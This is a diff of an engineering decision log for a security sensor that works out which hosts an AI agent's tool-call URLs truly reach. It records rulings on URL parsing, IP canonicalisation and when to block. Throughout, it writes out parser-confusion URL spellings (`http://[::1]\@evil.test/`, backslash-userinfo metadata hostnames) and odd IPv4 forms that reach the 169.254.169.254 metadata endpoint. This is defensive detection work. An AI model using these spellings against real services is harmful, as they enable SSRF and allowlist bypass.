-   reads, the most permissive version measured.** V-4 requires the same answer
-   on every interpreter, and `urlsplit` is not the same function on every
-   interpreter. Its bracketed-host validation, a security backport, raises on
-   `http://[::1]\@evil.test/` on CPython 3.10.21 and 3.12.14, and returns
-   `evil.test` on 3.12.2. httpx sends it to `evil.test` on all three.
-   - 3.12.2's netloc checks are reproduced exactly: brackets balance; the
-     netloc's FIRST bracketed segment is IPv6 or IPvFuture; no NFKC fold into a
-     delimiter.
-   - Its host rule is reproduced exactly: the part between the host's first
-     `[` and the next `]`, otherwise the part before the first `:`.
-   - Measured on the committed corpus: the reading matches 3.12.2's
-     `urllib.parse` on every spelling (zero under-reads and zero over-reads
-     there).
-
-   *[Corrected 2026-10-03, M0 milestone review: an earlier version of this
-   entry described one bracket rule for every reading and read past a bracket
-   anywhere. That over-read hosts no consumer reads (`http:ev[il].test` as
-   `il`), and its first repair under-read what 3.12.2 reads.]*
-
-   **Where `urlsplit` refused the WHATWG string, WHATWG's own bracket rule
-   applies:** a `[` must open the host and enclose an IPv6 literal, and any
-   other bracket means no host.
-   (`test_q1_every_reading_…[http://[::1]\@evil.test/x]`, red on Linux with
-   `urlsplit`, green on all three interpreters with the split.)
-2. **Where `urlsplit` refuses the WHATWG string, the value stays `parse_failure`
-   (decision 7), and every host the split finds is a finding beside it.** This
-   is Q1 applied to a refusal, in R1's shape. It was found by the adversarial run on WPT
-   `urltestdata.json` (web-platform-tests `c48d587`): `http://&a:foo(b]c@d:2/`
-   goes to `d` through httpx, urllib3 and WHATWG, while the core read nothing
-   (`Q1-urlsplit-refusal`).
-3. **`authority_of` returns `None` for a value with two authorities**, exactly
-   as it does for a two-mailbox list. It never picks one, because either pick
-   is a host some consumer does not send to.
-   (`test_q1_authority_of_answers_none_for_a_value_with_two_authorities`.)
-4. **One over-read class is allowed in the differential:
-   `urlsplit-bracket-validation`.** These are hosts CPython 3.12.2's
-   `urllib.parse` reads and the post-backport releases refuse. The reason is
-   checked both ways by
-   `test_the_named_over_read_class_stands_for_a_measured_interpreter`: on an
-   interpreter whose `urlsplit` reads like 3.12.2, the class must absorb
-   NOTHING; on a post-backport one, it must be needed.
-
-   Measured on the committed corpus: it absorbs **0** on macOS 3.12.2 and
-   **115** on Linux 3.10.21 and on 3.12.14.
-
-   *[Corrected 2026-10-03, M0 milestone review: an earlier version said "31
-   spellings, Linux only", and gave the reason as "urllib.request on such an
-   interpreter sends there". Both were wrong. urllib.request passes the ~~raw~~
-   netloc on (*M3 review: percent-DECODED, userinfo included; "raw" was false*)
-   and reaches neither host here, and the count was from an earlier grid
-   and an earlier split.]*
-
-## Decisions made in the A2 build (M3) that still need a ruling
-
-1. **An empty hex part is 0** (`coerce_ip`). `https://0x.0x.0/` is `ip:0.0.0.0`,
-   `http://0x.1.1.1/` is `ip:0.1.1.1`, `http://0x/` is `ip:0.0.0.0`: WHATWG's
-   IPv4 number parser reads an empty hex part as 0. The macOS resolver httpx
-   and urllib3 hand the name to reads `0x.0x.0` and `0x.1.1.1` ~~and so does
-   the macOS resolver~~ *[corrected, M3 review: it REFUSES `0x` alone; WHATWG
-   reads it]*. glibc refuses all three. That
-   makes this a superset reading on Linux, not an over-read, because WHATWG
-   reaches it everywhere. Found by the M0 WPT run, pinned by the
-   `M3-empty-hex-part` supplementary row. SEMANTIC for paid (P4).
-2. **Integer parts are digit-checked, not left to `int()`.** `int()` accepts `_`
-   separators, so the core read `0x_1.1.1.1` as `ip:1.1.1.1` and `0_7.1.1.1` as
-   `ip:7.1.1.1`. inet_aton and WHATWG read neither, so both were over-reads. Both
-   are now names. Found while writing decision 1's pin.
-3. **Not decided here: the macOS resolver wraps a decimal integer modulo
-   2**32** (`4294967296` -> `0.0.0.0`; glibc and WHATWG refuse it). Q22 exempted
-   exactly one darwin class. This is a second one. It is pinned as a strict xfail
-   on darwin (`test_bsd_libc_integer_wrap_is_an_unruled_platform_class`), and it
-   is neither exempted nor read.
-
-## Ruling 2026-10-04 (A2): Q22 is RE-RULED, narrower — the old premise was wrong
-
-Q22 (2026-10-03) exempted the macOS resolver's decimal reading of leading-zero
-dotted quads **on the premise that it lands in reserved space**
-(0251.254.0251.254 -> 251.254.251.254, in 240/4). **That premise was wrong.**
-`000169.254.000169.254` and `169.000254.169.000254` reach **169.254.169.254**, the
-metadata endpoint (found by the M2 milestone review). The new rule:
-
-- The darwin exemption covers ONLY readings that reach no sensitive address.
-- A macOS-resolver reading that reaches link-local, loopback or private space is
-  read and classified, on every platform, never exempted. Developers run macOS,
-  and that is where an agent runs before anyone is watching.
-- Integer wrap is not exempt (`4294967296`, `0x100000000` -> 0.0.0.0). 0.0.0.0
-  reaches local services on most stacks.
-- The leading-zero embedded IPv4 that reaches public space
-  (`[0:1:2:3:4:5:192.0.02.1]`) is a named class, exempt, no fix.
-
-**As built (M4 prelude, the core's `_macos_sensitive_readings`).** Measured on
-macOS 2026-10-04, the resolver differs from inet_aton / WHATWG in three ways:
-
-1. A 4-part all-digit quad with a leading zero is DECIMAL.
-2. So is the IPv4 tail of an IPv6 literal.
-3. A single number above 2**32 - 1 wraps modulo 2**32, in decimal, hex and
-   octal (`0x1A9FEA9FE` -> 169.254.169.254).
-
-Each reading that lands in sensitive space is one more finding, the weakest
-decides (R1/Q1's shape), and url_parse picks it up through `classify_value`.
-
-**Two things the ruling did not anticipate, applied by its general rule:**
-
-- The embedded class is NOT always public. `[::ffff:169.254.0169.254]` resolves
-  to the mapped link-local address, so that variant is READ. Only the
-  public-space form stays exempt.
-- `251.254.251.254`, Q22's original example, is `is_private` to Python's
-  `ipaddress` (240/4 is listed as reserved), so under the new rule even it is
-  read.
-
-Paid pin: SEMANTIC. `expected.jsonl` gains the `Q22-rerule-macos-decimal-quad`
-row.
-
-## Decided 2026-10-04 (A2): R4 binds url_parse too — the M3 xfail contradicted it *(qualified below)*
-
-W1's R4 rules that `http:evil.test` (a special scheme with no `//`) names
-`evil.test`. M3 pinned `http:metadata.google.internal/` as a strict xfail in
-url_parse ("`host` stays urlsplit's"). **These are the same obligation, not two
-different ones, so the xfail contradicted a settled ruling and is fixed.** *[Qualified by the M4 milestone review: §2.1 limited M3 to `address` ("Only `address` comes from the core"), and R4 was ruled for the core's extraction. The accurate framing is a known gap CLOSED BY CHOICE under Q2's superset rule, not a breach of a ruling. The detection delta it causes is now declared in `url_parse_deltas.py`.]*
-
-- R4 is a fact about the CONSUMERS: WHATWG, i.e. Node fetch and undici-backed MCP
-  servers, sends that spelling to that host. It is not a value-origin policy.
-- url_parse exists to decide what a tool call's URL reaches, and A2 Q2's superset
-  rule binds it as it binds the core. A component that sees fewer hosts than the
-  transport reaches is the bypass shape this whole build closes.
-- §2.1's "`UrlShape.host` keeps today's spelling" was about the host-string
-  rules' spelling (lowercase, root dot stripped). It was not a licence to read
-  fewer hosts. A different obligation would need a component that does not
-  decide reachability, and url_parse is not one.
-
-**As built:** where urlsplit finds no host, url_parse fills `host` from the core's
-R4 rewrite (`_SPECIAL_RE` + `_whatwg`).
-
-**Still open, named:** the hostname MIRROR shape
-(`http://metadata.google.internal\@corp.example/`). `host` is single-valued, so
-the host-string rules see urlsplit's `corp.example` while WHATWG reaches the
-metadata name. Q1's obligation, for hostnames, needs a hosts tuple on
-`UrlShape`.
-
-## Ruling 3.1 CHANGED (owner, 2026-10-04, A2 after M5): `record_hop` binds no ledger
-
-**Was:** `record_hop` binds an explicit ledger iff none is bound (§1.4 / M5).
-**Now:** `record_hop` binds nothing. Only `begin_flow()` and `extract_context()`
-bind (fresh), and `clear_flow()` unbinds.
-
-**Why.** A ledger bound by `record_hop` has **no owner and no unbind**, so it
-outlives the request. ~~The sensor calls `record_hop` itself, through
-`_resolve_provenance` → `build_provenance`, whenever a host passes a per-call
-principal without `begin_flow()`.~~ *[Corrected 2026-10-04, measured while
-writing the failing test: FALSE. `_resolve_provenance` returns early when a
-per-call principal is set and no flow is active, so the sensor never reaches
-`record_hop` that way. The claim came from the M5 silent-failure review, whose
-repro called `build_provenance` directly, and it reached the owner through my M5
-report. What DOES reach the old consequence is a host that calls the public
-`provenance_chain.record_hop` / `build_provenance` itself without
-`begin_flow()`, which is what the M5 milestone review measured. The decision
-stands on the lifetime argument alone.]* Pools reuse threads by design, so on a reused thread user
-A's principal input authorized user B's call (V-27's cross-request carry,
-measured by the M5 milestone review). The defect was never that `record_hop`
-binds. It was a ledger nobody owns. Options that kept the implicitly bound
-ledger and reasoned about when it is safe were rejected as the same lifetime
-bug wearing a label.
-
-**Cost, measured.**
-- The sensor's per-call-principal path (no `begin_flow()`) reads `no_flow` on
-  every tool call and logs the Q6 warning once. It never reached `record_hop`,
-  so it is unchanged by this ruling.
-- A host that calls `record_hop` / `build_provenance` directly with no
-  `begin_flow()` now gets no ledger: `no_flow` until `record_hop` marks the
-  chain, then `ledger_absent`.
-- Neither path has value-origin detection. That is the fail-safe direction,
-  and the warning names `begin_flow()`.
-
-**Pinned by** `test_ruling_3_1_changed_user_a_authority_never_reaches_user_b_on_a_reused_thread`,
-red against the old ruling. **The provenance-chain tests CANNOT see this
-class:** the carry lives in the value-origin ledger, not in the chain, tiers
-or inbound mark those suites check. They stayed green through every variant of
-it (M5 sabotage: 79 passed). Do not read their green as evidence about ledger
-lifetime.
-
-## Decided 2026-10-04 (A2, after M6): truncation is a verdict state; S25 needs paid's confirmation
-
-**Truncation (owner).** The recorded principal input stays capped at 65,536 **[Narrowed 2026-10-05: input_truncated and ledger_saturated do not block; the input is no longer cut, the core reads atoms from all of it.]**
-chars (M6), but a destination past the cap no longer reads a silent
-`unresolved`. If the flow's principal input was capped and a lookup misses, the
-wire is **`input_truncated`**, a TENTH wire value. Its verdict is NOT_EVALUATED,
-so it never blocks, like `ledger_saturated`. **[Superseded by RULING 1+2 (2026-10-04): both block under ENFORCE.]** Its own §3.4 row reads: "the **[Narrowed 2026-10-05: input_truncated and ledger_saturated do not block; the input is no longer cut, the core reads atoms from all of it.]**
-principal's input was longer than value origin records; a destination past that
-point cannot be traced." An untrusted finding still outranks it. Absence is a
-row, never a missing row. **This is a vocabulary and interface change:**
-`WireValue`, `row_text.json` (the export the Brain is MEANT to be checked against; *[M7 review: no Brain copy exists yet. delphi-sentinel's branch reads "when row_text.json lands from open" and lists nine values, so the Brain would store `input_truncated` as NULL]*) and
-`record_principal_input(..., truncated=False)` changed. Paid's re-vendor and the
-Brain/blank-canvas row tables must learn the value before M9 emits the field.
-
-**S25 agrees with paid's reference BY ACCIDENT (owner): this is a note, not a
-fix.** After M6, `set_origin` plus a principal-only emit gives (`no_flow`,
-`unresolved`), paid's pair. Nobody designed it: the input seam binds an implicit
-ledger on every input (S-2), and `set_origin` plays no part (the same calls
-without it give the same pair). **Paid's semantics were NOT verified from this
-repo.** Confirm S25 against paid's spec when paid re-vendors, before relying on
-the agreement.
-
-## What A1 does not do
-
-It adds no seams and sends nothing anywhere.
-`scanner/url_parse.py` is unchanged. The IP canonicalisation it will import from
-the core is `_authority.coerce_ip` / `ip_key`, and moving `url_parse` onto it is
-A2. The 456-row oracle is untouched by A1 because nothing calls the core yet.
-Showing that RECORD mode leaves it byte-identical is A2's obligation (C-11).
-
-
-## 2026-10-04 — after M8: bounds, seam identity, names (owner)
-
-- **RULING 1+2.** Every bound emits a visible state, and under ENFORCE it blocks. **[Narrowed 2026-10-05: only result_unread blocks; see the 2026-10-05 section.]**
-  - New wire values: `argument_bound` (this call's argument walk hit a bound) and `result_truncated` (a recorded result was cut AND the lookup missed). Twelve values in all.
-  - Supersedes S16's expected `unresolved` on a walk bound, V-15's silent 64 KiB drop, and, as an extension the owner is asked to confirm, the M6 rule that `input_truncated` never blocks. `ledger_saturated` blocks too.
-  - Cap numbers unchanged.
-- **RULING 3a.** `scan(..., direction="tool_result", tool=, arguments=)` amends V-26.
-- **RULING 3b.** A flagged benign input is a documented limitation (docs/value-origin-enforce.md), not patched.
-- **RULING 4.** Category `untrusted_destination`; rule `ORIGIN_UNTRUSTED_DESTINATION`. `ORIGIN_UNTRUSTED_DESTINATION_KEYED` is emitted nowhere and is defined in no document found. `value_origin_unauthorized` is not carried. **[Corrected 2026-10-05, owner: designed (Tier 2 keyed variant), not implemented.]**
-- **Q18 under RULING 1+2 (2026-10-05, owner).** An unread I/O-backed result is a bound. It gets the wire value `result_unread`, thirteen in all, and blocks under ENFORCE. Q18's "report them `not_recorded` in the manifest" was never built and is superseded: the manifest has no per-read field. **[Still blocks after the 2026-10-05 narrowing, under `ORIGIN_UNEXAMINABLE_SOURCE`.]**
-
-## 2026-10-05 — the bounds ruling narrowed; names; the keyed variant (owner)
-
-- **Narrowed.** *"The goal was never that: it was don't lose the destination. Blocking is the fallback for a value that genuinely cannot be examined, not the answer to a cost control."*
-  - `argument_bound`, `input_truncated` and result truncation STOP BLOCKING. Cheap destination-atom extraction runs over the whole value; only the expensive examination stays bounded.
-  - `ledger_saturated` stops blocking, with a visible state and a loud warning. The owner asked for a recommended cap; it is in docs/value-origin-enforce.md.
-  - `result_unread` (Q18) KEEPS BLOCKING.
-  - Supersedes the "blocks" half of RULING 1+2 (2026-10-04) and its extension to input_truncated / ledger_saturated.
-- **A separate rule id for a block on a source that could not be examined:** `ORIGIN_UNEXAMINABLE_SOURCE`. Its category is `unexaminable_source` (category not named by the owner; for confirmation). It never carries `ORIGIN_UNTRUSTED_DESTINATION` (ruled) or `intent.value_origin_untrusted` (MY decision, not ruled; C-19's waterfall keys `decided` on that id, so an unexaminable block may show no deciding stage — for the owner). **[Superseded 2026-10-06 (owner): `intent.value_origin_untrusted` is carried ALONGSIDE `ORIGIN_UNEXAMINABLE_SOURCE`; see "Why an unexaminable block carries TWO rule ids".]**
-- **`ORIGIN_UNTRUSTED_DESTINATION_KEYED`: DESIGNED, NOT IMPLEMENTED.** It comes from the original value-origin design as the Tier 2 keyed variant and was never built. Nothing emits it, and no emission is invented for it (owner, 2026-10-05: "my error").
-- **Left open on purpose:** the silent-failure review's MEDIUM. `frameworks._scan_result`'s fallback, for a sensor without `_scan_tool_result`, passes no tool identity. It fails safe, and the owner would rather it stay visible than be quietly patched.
-
-## 2026-10-06 — the atom pass bounded by work; two ledger budgets; both audit ids (owner)
-- **The atom pass is bounded by WORK** (option a): 500,000 units per seam call (1/char + 64/atom). Hitting it is a visible state, `extraction_incomplete`, fourteen wire values in all, and it does NOT block. (c), relaxing the size guarantee, is REFUSED. (b), a pre-filter, only if measured; not adopted.
-- **Ledger:** a separate 65,536 budget for key n-grams, 10,000 kept for destinations (the recommendation, approved). The laundering gap keeps its strict xfail and is named in the ENFORCE docs. **[Superseded 2026-10-06, rulings 2/4: a dropped DESTINATION write (the ledger full, or recording it faulted) now reads `write_dropped` and BLOCKS as unexaminable; the laundering xfail is closed. See "A dropped write blocks" below.]**
-- **`unexaminable_source` / `ORIGIN_UNEXAMINABLE_SOURCE` approved, with `intent.value_origin_untrusted` RESTORED alongside it.** It is the Brain-side spec's audit id, and the intent lens filters on it.
-- **The 4,001 vs 3,999 cliff** is recorded as a known artefact.
-
-## 2026-10-06 — M9 built behind a consumer gate (owner delegated the shape)
-`valueOrigin` is emitted on every tool-call event, behind `value_origin_wire`. The default `"v1"` is exactly the nine values the Brain's code accepts. It is safe to ship now, because no value the consumer rejects is ever sent. `"v2"` is all fourteen, for after a deployed Brain accepts them; `"off"` emits nothing. Chosen over default-off because v1 delivers what the consumer can store today without one rejected value; the cost is that five states are withheld (and named in a warning) until v2. SCHEMA_VERSION 0.3.0 (Q14).
-
-## 2026-10-06 — rulings 1–4 on reused threads, the examined limit, the Splunk TA, a dropped write (owner)
-- **1. Reused worker threads: FIX, gates M9 going further.** STOPPED at the owner's own condition: binding on entry for a flow-less host needs a seam change (a request scope, or an S-2/V-27 change). The framework hooks (CrewAI kickoff, Agents Runner.run) could be fixed within today's seams and are NOT shipped alone. Two strict xfails pin the defect (no input of B's own; and begin_flow without clear_flow).
-- **2. The examined limit: capped by work.** `EXAMINED_WORK_BUDGET = 1,000,000` units per result; spending it is `extraction_incomplete`, which does not block.
-- **3. The Splunk TA "Targets 0.2.0": left.** It is a published artifact in a different lane, recorded in the backlog below.
-- **4. A dropped ledger write BLOCKS** as `write_dropped`, under the unexaminable names. Extended after review, for the owner to confirm: a write lost to a FAULT (a raising `model_dump`, a mis-split span list, a non-string input) is a write the ledger did not accept.
-
-### Backlog (owner-ruled, outside this branch)
-- The Splunk TA says it "Targets 0.2.0" (`README.md`, `app.conf`, `app.manifest`, `props.conf`); the schema is 0.3.0 since M9. `KV_MODE = json` still extracts `gen_ai.security.value_origin`. (Owner, 2026-10-06: leave it; do not widen this branch.)
+4. After an address literal, a port alone (`10.0.0.5:80`), a query, a fragment or
+   a path counts, and so does IPv6 in brackets.
+5. Results record scheme-less addresses only in the strict literal forms; the
+   inet_aton forms are read in arguments (§2, Scheme-less values).
+6. A CIDR like `10.0.0.0/8` reads `ip:10.0.0.0`, which is `unresolved` unless
+   something recorded it. `HTTP: 404` is not a URL (a space follows the colon).
+7. The prose URL scan records `http:///evil.test` as `evil.test`; prose
+   `http:evil.test` is recorded by the bare-host scan.
+8. The RFC 3986 reading is a written-out split that reads exactly what CPython
+   3.12.2's `urlsplit(...).hostname` reads, the most permissive version measured,
+   so it is the same on every interpreter. Where `urlsplit` refuses the WHATWG
+   string, WHATWG's own bracket rule applies: a `[` must open the host and
+   enclose an IPv6 literal.
+9. Where `urlsplit` refuses the WHATWG string, the value is `parse_failure` and
+   every host the split finds is a finding beside it.
+10. `authority_of` returns `None` for a value with two authorities (§3).
+11. One over-read class is named in the differential:
+    `urlsplit-bracket-validation`, hosts CPython 3.12.2's urllib.parse reads and
+    later patch releases refuse. It is checked both ways: it absorbs nothing on an
+    interpreter that reads like 3.12.2 and must be needed on one that does not.
+    The mailbox reading is named the same way, and each of its findings is checked
+    against `email.utils`.
+12. Integer parts are digit-checked (§2, Addresses).
+13. A name with a port and nothing after it is a bare host, and not a destination.
+14. The first-emission lock: the S22 first-emission test and the all-or-none
+    visibility test both stay in the suite; the second is the reliable detector of
+    a missing lock.
